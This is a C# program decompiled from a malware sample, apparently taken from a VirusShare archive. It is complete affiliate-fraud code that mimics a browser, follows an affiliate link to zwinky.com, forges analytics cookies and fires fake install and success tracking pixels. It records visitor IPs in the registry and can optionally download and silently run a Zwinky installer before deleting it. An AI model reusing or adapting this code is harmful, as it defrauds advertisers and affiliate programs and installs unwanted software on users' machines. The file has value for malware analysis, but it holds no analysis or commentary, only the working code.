// Decompiled with JetBrains decompiler
// Type: AffiliateExecuterNoWin.Program
// Assembly: AffiliateDLer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 18A3D0BD-4C25-44BB-9FB6-D187ABFA142C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Net-Worm.Win32.Mytob.mfm-8736720f34a5bf521582d2ee881001d9a06f175d45483727c6c86d052522be44.exe

using HTTPAgent;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace AffiliateExecuterNoWin
{
  internal static class Program
  {
    [STAThread]
    private static void Main(string[] args)
    {
      string str1 = "http://avataryou.info/toolbar";
      string appName = "ddl7";
      bool flag1 = false;
      string URL = "http://lookforpages.com/checkip/index.php";
      bool flag2 = false;
      string str2 = "ZwinkySetup2.3.67.1.SA.HP.ZJfox000.exe";
      string url1 = "http://ak.exe.imgfarm.com/images/nocache/funwebproducts/2.3.67.1/" + str2;
      if (new DateTime(3000, 1, 1) < DateTime.Now)
        return;
      Agent agent = new Agent();
      agent.EmulateBrowser();
      if (flag1)
      {
        string data = DataExtractor.ExtractDataArray(agent.GetURL(URL), "(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b)", "$1")[0];
        string savedIps = Program.GetSavedIPs(appName);
        if (savedIps.IndexOf(data) >= 0)
          return;
        Program.SetSavedIPs(appName, savedIps + data + ";");
      }
      agent.Referer = str1;
      string data1 = DataExtractor.ExtractDataArray(agent.GetURL("http://www.mb01.com/lnk.asp?o=1347&c=918273&a=42194"), "window.location=\"([^\"]+)", "$1")[0];
      string url2 = agent.GetURL(data1);
      string referer = agent.Referer;
      if (!referer.StartsWith("http://www.zwinky.com"))
        return;
      string data2 = DataExtractor.ExtractDataArray(url2, "splash/partner/([^\"']+)", "$1")[0];
      Program.addTrackingCookies(agent.cookieJar, "zwinky.com");
      Program.GetTrackingUrl(agent, "Zwinky%20Download", "www.zwinky.com", "-", referer.Replace("http://www.zwinky.com", ""), true);
      Program.GetTrackingUrl(agent, "Zwinky%20Download", "www.zwinky.com", "", "/clicks/splash/cookie_enabled", false);
      Program.GetTrackingUrl(agent, "Zwinky%20Download", "www.zwinky.com", "", "/clicks/splash/partner/" + data2, false);
      agent.GetURL("http://www.zwinky.com/dl/install.jhtml");
      Program.GetTrackingUrl(agent, "Zwinky%20Download", "www.zwinky.com", "-", "/dl/install.jhtml", false);
      Program.GetTrackingUrl(agent, "Zwinky%20Download", "www.zwinky.com", "", "/clicks/splash/install_ie_sp2_progress", false);
      if (flag2)
      {
        if (Directory.Exists("C:\\Users\\Public\\Documents\\"))
          str2 = "C:\\Users\\Public\\Documents\\" + str2;
        agent.getURL2File(url1, str2);
        try
        {
          Process.Start(str2).WaitForExit();
          System.IO.File.Delete(str2);
        }
        catch
        {
        }
      }
      string data3 = DataExtractor.ExtractDataArray(agent.GetURL("http://www.zwinky.com/dl/success.jhtml"), "<script src=\"([^\"]+)", "$1")[0];
      agent.GetURL(data3);
      Program.GetTrackingUrl(agent, "Success", "www.zwinky.com", "-", "/dl/success.jhtml", false);
      string url3 = agent.GetURL("http://www.zwinky.com/dl/successPixels.jhtml");
      Program.GetTrackingUrl(agent, "Success", "www.zwinky.com", "", "/clicks/settings/checkboxes/sa2_on/hp_on", false);
      Program.GetTrackingUrl(agent, "Success", "www.zwinky.com", "", "/clicks/bartools/download_complete", false);
      Program.GetTrackingUrl(agent, "Success", "www.zwinky.com", "", "/clicks/settings/active_x/u%253D" + Program.randomString(22) + "%2526p%253D" + data2, false);
      Program.GetRecursivePixels(agent, url3);
    }

    private static void GetRecursivePixels(Agent agent, string html)
    {
      html = Regex.Replace(html, "<noscript>.*?</noscript>", "");
      List<string> stringList = new List<string>();
      stringList.AddRange((IEnumerable<string>) DataExtractor.ExtractDataArray(html, "pt src=\" ?([^\"]+)", "$1"));
      stringList.AddRange((IEnumerable<string>) DataExtractor.ExtractDataArray(html, "<img src=\\\\?\" ?([^\"\\\\]+)", "$1"));
      string referer = agent.Referer;
      foreach (string str in stringList)
      {
        agent.Referer = referer;
        string url = agent.GetURL(str.Trim().Replace("&amp;", "&"));
        Program.GetRecursivePixels(agent, url);
      }
    }

    private static string randomString(int len)
    {
      string str1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
      Random random = new Random();
      string str2 = "";
      for (int index = 0; index < len; ++index)
        str2 += (string) (object) str1[random.Next(str1.Length)];
      return str2;
    }

    private static string GetSavedIPs(string appName)
    {
      string savedIps = ";";
      try
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\" + appName, false);
        if (registryKey != null)
          savedIps = registryKey.GetValue("ips").ToString();
      }
      catch
      {
      }
      return savedIps;
    }

    private static void SetSavedIPs(string appName, string val)
    {
      try
      {
        (Registry.CurrentUser.OpenSubKey("SOFTWARE\\" + appName, true) ?? Registry.CurrentUser.CreateSubKey("SOFTWARE\\" + appName)).SetValue("ips", (object) val);
      }
      catch
      {
      }
    }

    public static void addTrackingCookies(CookieContainer cookies, string domain)
    {
      Random random = new Random();
      Uri uri = new Uri("http://" + domain + "/");
      long totalSeconds = (long) (DateTime.Now.ToUniversalTime() - new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc)).TotalSeconds;
      string str1 = Program.uHash(domain);
      string str2 = str1 + "." + (object) random.Next(int.MaxValue) + "." + (object) totalSeconds + "." + (object) totalSeconds + "." + (object) totalSeconds + ".1";
      string str3 = str1 + "." + (object) totalSeconds + ".1.1.utmcsr=ZJxdm025|utmccn=(not+set)|utmcmd=(not+set)";
      cookies.Add(uri, Program.createCookie("__utma", str2, 1800));
      cookies.Add(uri, Program.createCookie("__utmb", str1, 1800));
      cookies.Add(uri, Program.createCookie("__utmc", str1, 1800));
      cookies.Add(uri, Program.createCookie("__utmz", str3, 1800));
    }

    public static string uHash(string d)
    {
      int num1 = 0;
      for (int startIndex = d.Length - 1; startIndex >= 0; --startIndex)
      {
        int num2 = (int) char.Parse(d.Substring(startIndex, 1));
        num1 = (num1 << 6 & 268435455) + num2 + (num2 << 14);
        int num3;
        if ((num3 = num1 & 266338304) != 0)
          num1 ^= num3 >> 21;
      }
      return num1.ToString();
    }

    public static Cookie createCookie(string name, string value, int timeout) => new Cookie(name, value)
    {
      Expires = DateTime.Now.AddSeconds((double) timeout)
    };

    public static string GetTrackingUrl(
      Agent agent,
      string title,
      string hostname,
      string referer,
      string tracking,
      bool addutmcn)
    {
      return agent.GetURL(Program.createTrackingUrl(title, hostname, referer, tracking, addutmcn));
    }

    public static string createTrackingUrl(
      string title,
      string hostname,
      string referer,
      string tracking,
      bool addutmcn)
    {
      Random random = new Random();
      string str = Screen.PrimaryScreen.Bounds.Width.ToString() + "x" + (object) Screen.PrimaryScreen.Bounds.Height;
      return "http://utm.trk.zwinky.com/__utm.gif?utmwv=6.1&utmn=" + (object) random.Next(int.MaxValue) + "&utmsr=" + str + "&utmsc=32-bit&utmul=en-us&utmje=1&utmjv=1.3&utmfl=10.0" + (addutmcn ? (object) "&utmcn=1" : (object) "") + (title == "" ? (object) "" : (object) ("&utmdt=" + title)) + "&utmhn=" + hostname + (referer == "" ? (object) "" : (object) ("&utmr=" + referer)) + "&utmp=" + tracking;
    }
  }
}
